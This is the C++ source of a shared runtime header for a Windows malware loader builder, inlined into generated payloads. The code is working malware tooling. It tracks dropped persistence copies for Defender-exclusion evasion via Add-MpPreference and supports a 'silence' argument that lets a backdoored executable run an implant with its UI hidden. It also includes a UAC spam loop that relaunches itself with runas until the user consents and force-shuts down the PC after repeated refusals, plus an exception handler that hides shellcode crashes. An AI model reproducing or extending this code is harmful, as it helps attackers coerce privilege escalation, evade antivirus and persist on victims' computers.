// ============================================================================
// wash_runtime.h — shared loader runtime
//
// Persistence-drop tracker, install-path resolver, UAC helpers, single-instance
// guard, and a vectored exception handler. Always emitted into generated C++
// sources via the {{PREAMBLE}} template placeholder.
//
// Lives next to default.yaml so it can be edited, syntax-highlighted and
// linted independently from the C# build orchestrator. CompilerService reads
// this file at compile time and inlines it verbatim — there is no #include
// path setup, no separate translation unit.
//
// Contract for snippet authors:
//
//   wash_install_path is populated by an Installation-category snippet (if
//   any) after it copies the loader to the operator-chosen directory.
//   Persistence and evasion snippets call wash_payload_path() to obtain the
//   path they should register/copy/exclude — so persistence is always tied
//   to the installed location, not whatever ephemeral folder the binary was
//   first launched from.
//
//   All persistence snippets call wash_track(path) for every dropped copy.
//   The Evasion DefenderExclusion snippet iterates wash_copies[] to register
//   every drop with Add-MpPreference. wash_track_self() is invoked
//   automatically before main() via a static initializer so the running path
//   is always present even when no persistence snippet ran.
// ============================================================================

#include <shellapi.h>
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

static const size_t WASH_COPIES_MAX = 32;
static wchar_t wash_copies[WASH_COPIES_MAX][MAX_PATH];
static int wash_copies_count = 0;

// Set by an Installation snippet (or left empty for run-in-place mode).
// When empty, wash_payload_path() falls back to the running module path —
// preserving today's behaviour for users who don't pick an Installation step.
static wchar_t wash_install_path[MAX_PATH] = {0};

static const wchar_t* wash_payload_path(void)
{
    if (wash_install_path[0] != L'\0')
        return wash_install_path;
    static wchar_t self[MAX_PATH] = {0};
    if (self[0] == L'\0')
        GetModuleFileNameW(NULL, self, MAX_PATH);
    return self;
}

// Set by a BackdoorConfig/SilenceArg snippet. When non-empty, persistence
// snippets register the payload command with this argument suffix so that
// the backdoored PE's silence-mode stub can detect it at next launch and
// take the silent execution path (implant runs, host UI is suppressed).
static wchar_t wash_silence_arg[256] = {0};

// Returns the full persistence command: "path [arg]" when a silence arg is
// configured, or just the plain path when no arg is set. Persistence and
// evasion snippets use this as the registered command, not the raw path.
static const wchar_t* wash_payload_cmd(void)
{
    static wchar_t cmd[MAX_PATH + 256] = {0};
    if (wash_silence_arg[0] == L'\0')
        return wash_payload_path();
    if (cmd[0] == L'\0')
        wsprintfW(cmd, L"%s %s", wash_payload_path(), wash_silence_arg);
    return cmd;
}

static void wash_track(const wchar_t* path)
{
    if (!path || wash_copies_count >= (int)WASH_COPIES_MAX)
        return;

    size_t len = wcslen(path);
    if (len == 0 || len >= MAX_PATH)
        return;

    // Skip duplicates so the same path is not registered twice.
    for (int i = 0; i < wash_copies_count; i++)
        if (_wcsicmp(wash_copies[i], path) == 0)
            return;

    wcscpy_s(wash_copies[wash_copies_count], MAX_PATH, path);
    wash_copies_count++;
}

static void wash_track_self(void)
{
    wchar_t self[MAX_PATH] = {0};
    if (GetModuleFileNameW(NULL, self, MAX_PATH) > 0)
        wash_track(self);
}

static BOOL wash_is_elevated(void)
{
    BOOL elevated = FALSE;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &token))
    {
        TOKEN_ELEVATION elevation = {0};
        DWORD size = sizeof(elevation);

        if (GetTokenInformation(token, TokenElevation, &elevation, size, &size))
            elevated = elevation.TokenIsElevated;

        // Fallback for SYSTEM and non-split-token accounts where TokenIsElevated
        // may be reported as 0 despite full admin group membership.
        if (!elevated)
        {
            HANDLE impToken = NULL;
            if (DuplicateToken(token, SecurityImpersonation, &impToken))
            {
                PSID adminSid = NULL;
                SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
                if (AllocateAndInitializeSid(&ntAuth, 2,
                        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                        0, 0, 0, 0, 0, 0, &adminSid))
                {
                    CheckTokenMembership(impToken, adminSid, &elevated);
                    FreeSid(adminSid);
                }
                CloseHandle(impToken);
            }
        }

        CloseHandle(token);
    }

    return elevated;
}

// Best-effort forced shutdown when the operator refuses to elevate. Tries the
// privileged ExitWindowsEx path first (after enabling SE_SHUTDOWN_NAME), then
// falls back to spawning shutdown.exe which works under the regular user
// "Shut down the system" right that is granted by default.
static void wash_force_shutdown(void)
{
    HANDLE token = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
    {
        TOKEN_PRIVILEGES tp = {0};
        if (LookupPrivilegeValueW(NULL, L"SeShutdownPrivilege", &tp.Privileges[0].Luid))
        {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(token, FALSE, &tp, 0, NULL, NULL);
        }
        CloseHandle(token);
    }

    ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE | EWX_FORCEIFHUNG, 0);

    // Fallback: invoke shutdown.exe directly. Default user policy permits this.
    wchar_t cmd[] = L"shutdown.exe /s /t 0 /f";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    ExitProcess(1);
}

// Spam-loop UAC: re-launches the current binary with the "runas" verb until the
// user accepts. maxDenials == 0 means loop forever. Any positive value triggers
// wash_force_shutdown() once exceeded, satisfying "say yes or shutdown the PC".
// retryMs is the back-off between dialog dismissals; defaults to 300ms when 0.
static void wash_demand_elevation_or_shutdown(DWORD maxDenials, DWORD retryMs)
{
    if (wash_is_elevated())
        return;

    // In Session 0 (services, scheduled tasks running as SYSTEM) there is no
    // interactive desktop — ShellExecuteW("runas") cannot show a UAC dialog and
    // would silently fail, creating an infinite spin-loop. Skip the UAC dance.
    DWORD _wash_sessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &_wash_sessionId);
    if (_wash_sessionId == 0)
        return;

    if (retryMs == 0)
        retryMs = 300;

    wchar_t modulePath[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, modulePath, MAX_PATH);

    DWORD denials = 0;
    while (!wash_is_elevated())
    {
        HINSTANCE result = ShellExecuteW(NULL, L"runas", modulePath, NULL, NULL, SW_SHOW);

        if ((INT_PTR)result <= 32)
        {
            // SE_ERR_ACCESSDENIED (5) or SE_ERR_NOASSOC: user dismissed the prompt.
            denials++;
            if (maxDenials != 0 && denials >= maxDenials)
            {
                wash_force_shutdown();
                return; // not reached
            }
            Sleep(retryMs);
            continue;
        }

        // Elevated copy started successfully; current process can exit.
        ExitProcess(0);
    }
}

// Backwards-compatible: loop forever until elevation is granted.
static void wash_demand_elevation(void)
{
    wash_demand_elevation_or_shutdown(0, 300);
}

// Returns TRUE the first time this binary is launched; FALSE if another instance
// is already running. Uses a session-local named mutex derived from the module path
// so rename/move creates a separate lock identity.
static BOOL wash_single_instance(void)
{
    wchar_t self[MAX_PATH] = {0};
    wchar_t mutexName[64]  = {0};
    GetModuleFileNameW(NULL, self, MAX_PATH);
    DWORD hash = 2166136261u;
    for (int i = 0; self[i]; i++)
        hash = (hash ^ (DWORD)self[i]) * 16777619u;
    wsprintfW(mutexName, L"Local\\wash_%08X", hash);
    HANDLE h = CreateMutexW(NULL, TRUE, mutexName);
    if (h == NULL)
        return TRUE; // creation failed; allow run rather than silently exit
    return GetLastError() != ERROR_ALREADY_EXISTS;
}

// Vectored exception handler: catches hardware faults thrown by shellcode and
// exits cleanly instead of producing a WER crash dialog or memory dump.
static LONG WINAPI _wash_veh(PEXCEPTION_POINTERS ep)
{
    DWORD code = ep->ExceptionRecord->ExceptionCode;
    if (code == EXCEPTION_ACCESS_VIOLATION    ||
        code == EXCEPTION_ILLEGAL_INSTRUCTION ||
        code == EXCEPTION_STACK_OVERFLOW      ||
        code == EXCEPTION_PRIV_INSTRUCTION    ||
        code == EXCEPTION_INT_DIVIDE_BY_ZERO)
    {
        ExitProcess(0);
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// File-scope object whose constructor runs before main() and registers the
// running executable path in wash_copies[]. Removes the need for snippets to
// call wash_track_self() explicitly.
struct __wash_self_track_init
{
    __wash_self_track_init()
    {
        wash_track_self();
        if (!wash_single_instance()) ExitProcess(0);
        AddVectoredExceptionHandler(0, _wash_veh);
    }
};
static __wash_self_track_init __wash_self_track_init_instance;
